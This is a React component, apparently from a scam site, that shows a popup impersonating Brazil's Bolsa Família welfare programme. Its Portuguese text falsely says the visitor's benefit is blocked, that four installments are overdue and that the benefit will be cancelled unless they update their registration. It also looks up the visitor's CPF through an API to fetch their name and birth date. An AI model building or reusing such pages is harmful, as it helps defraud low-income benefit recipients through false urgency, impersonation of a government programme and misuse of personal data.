import { useEffect, useState } from 'react';
import { useLocation } from 'wouter';
import { Lock } from 'lucide-react';
import cadeadoIcon from '@assets/cadeado-webp.webp';
import { useUserStore } from '../store/userStore';
import { consultarCpf } from '../services/cpfService';

interface PopupBolsaFamiliaProps {
  nome?: string;
  cpf?: string;
}

export function PopupBolsaFamilia({ nome, cpf }: PopupBolsaFamiliaProps) {
  const [isVisible, setIsVisible] = useState(false);
  const [loading, setLoading] = useState(false);
  const [, navigate] = useLocation();
  const { setUserData } = useUserStore();

  // Efeito para buscar dados do CPF quando fornecido
  useEffect(() => {
    if (cpf) {
      const fetchUserData = async () => {
        setLoading(true);
        
        try {
          // Limpar o CPF (remover caracteres não numéricos)
          const numericCPF = cpf.replace(/\D/g, '');
          
          // Consultar a API
          const data = await consultarCpf(numericCPF);
          
          if (data) {
            // Salvar os dados do usuário no store
            setUserData({
              cpf: numericCPF,
              nome: data.nome || nome || '',
              nascimento: data.data_nascimento || '',
            });
          }
        } catch (error) {
          console.error('Erro ao buscar dados:', error);
        } finally {
          setLoading(false);
        }
      };
      
      fetchUserData();
    }
  }, [cpf, nome, setUserData]);
  
  // Mostrar o popup após 2 segundos
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsVisible(true);
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  const handleUpdateClick = () => {
    // Navegar para a página de parcelas do Bolsa Família
    navigate('/parcelas-bolsa-familia');
  };

  if (!isVisible) return null;

  return (
    <div className="fixed inset-0 flex items-center justify-center z-50 bg-black bg-opacity-50 p-4">
      <div className="bg-white rounded-xl shadow-lg max-w-md w-full mx-auto overflow-hidden">
        {/* Ícone centralizado */}
        <div className="flex justify-center mt-6 mb-4">
          <div className="relative">
            <img 
              src={cadeadoIcon} 
              alt="Chat com cadeado" 
              className="w-28 h-28" 
            />
          </div>
        </div>

        {/* Título */}
        <h2 className="text-[#333] text-2xl font-bold text-center mb-2 px-4">
          <span className="text-red-600">Benefício bloqueado!</span><br/><span className="font-extrabold">Atualize o cadastro para receber.</span>
        </h2>

        {/* Descrição */}
        <p className="text-[#666] text-center px-6 mb-4">
          Seu benefício foi bloqueado e você precisa atualizar seus dados para liberar as parcelas do seu Bolsa Família.
        </p>

        {/* Aviso Importante */}
        <div className="mx-6 mb-4 bg-[#fff2f2] border border-[#ffe6e6] rounded-md p-3">
          <p className="text-[#e05252] text-center text-sm">
            <span className="font-bold">AVISO IMPORTANTE:</span> Você possui 4 parcelas atrasadas que não recebeu! É necessário ATUALIZAR SEU CADASTRO para receber as parcelas, caso contrário, seu benefício será cancelado!
          </p>
        </div>

        {/* Espaço antes do botão */}
        <div className="mb-6"></div>

        {/* Botão */}
        <div className="px-6 pb-6">
          <button
            onClick={handleUpdateClick}
            className="w-full py-4 bg-[#ee8435] hover:bg-[#df7426] text-white font-medium rounded-md transition-colors"
          >
            Atualizar meu cadastro agora
          </button>
        </div>
      </div>
    </div>
  );
}